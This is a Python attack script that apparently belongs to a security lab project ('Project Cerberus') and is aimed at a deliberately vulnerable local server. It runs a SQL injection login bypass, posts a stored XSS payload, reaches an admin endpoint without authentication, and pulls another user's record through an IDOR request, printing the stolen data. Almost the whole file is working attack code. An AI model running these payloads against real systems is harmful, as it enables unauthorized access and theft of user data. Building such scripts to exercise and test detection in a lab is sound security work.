# in /project-cerberus/attack.py

import requests
import time

# The base URL of our vulnerable server
BASE_URL = "http://localhost:3001/api"

print("--- [PROJECT CERBERUS ATTACK SCRIPT] ---")
print(f"Targeting server at: {BASE_URL}\n")

def run_sqli_attack():
    """Attempts to log in as 'normal_user' using SQL Injection."""
    print("[*] Launching SQL Injection (SQLi) attack...")
    
    payload = {
        "username": "' OR '1'='1' -- ",
        "password": "fakepassword"
    }
    
    try:
        r = requests.post(f"{BASE_URL}/login", json=payload)
        
        if r.status_code == 200 and "Welcome, normal_user" in r.text:
            print("    [SUCCESS] SQLi Login successful!")
        else:
            print(f"    [FAILURE] SQLi Login failed. Server response: {r.status_code}")
            
    except requests.ConnectionError:
        print("    [ERROR] Connection failed. Is the server running?")

def run_xss_attack():
    """Posts a stored XSS payload as a comment."""
    print("\n[*] Launching Stored Cross-Site Scripting (XSS) attack...")
    
    payload = {
        "username": "xss_attacker",
        "comment_text": "<img src=x onerror=\"alert('XSS by Cerberus Script')\">"
    }
    
    try:
        r = requests.post(f"{BASE_URL}/products/1/comments", json=payload)
        
        if r.status_code == 201: # 201 Created
            print("    [SUCCESS] Stored XSS payload has been posted!")
        else:
            print(f"    [FAILURE] XSS post failed. Server response: {r.status_code}")

    except requests.ConnectionError:
        print("    [ERROR] Connection failed.")

def run_bac_attack():
    """Accesses an admin-only endpoint without authentication."""
    print("\n[*] Launching Broken Access Control (BAC) attack...")
    
    try:
        r = requests.get(f"{BASE_URL}/admin/all_users")
        
        if r.status_code == 200 and "admin" in r.text:
            print("    [SUCCESS] Accessed /api/admin/all_users and retrieved user list!")
        else:
            print(f"    [FAILURE] BAC attack failed. Server response: {r.status_code}")
            
    except requests.ConnectionError:
        print("    [ERROR] Connection failed.")

# --- NEW ATTACK FUNCTION ---
def run_idor_attack():
    """Attempts to steal another user's data (the admin, id: 2)."""
    print("\n[*] Launching Insecure Direct Object Reference (IDOR) attack...")
    
    # We are "User 1" but we are asking for "User 2's" data.
    try:
        r = requests.get(f"{BASE_URL}/users/2") 
        
        if r.status_code == 200 and "admin" in r.text:
            print("    [SUCCESS] IDOR successful! Stole data for user ID 2:")
            print(f"    {r.json()}")
        else:
            print(f"    [FAILURE] IDOR attack failed. Server response: {r.status_code}")
            
    except requests.ConnectionError:
        print("    [ERROR] Connection failed.")
# ---------------------------

# --- Main execution ---
if __name__ == "__main__":
    run_sqli_attack()
    time.sleep(1)  # Shortened pause
    
    run_xss_attack()
    time.sleep(1)
    
    run_bac_attack()
    time.sleep(1)
    
    # --- ADDED IDOR TO THE SCRIPT ---
    run_idor_attack()
    
    print("\n--- [ATTACK SCRIPT FINISHED] ---")
    print("Check your SOC Dashboard!")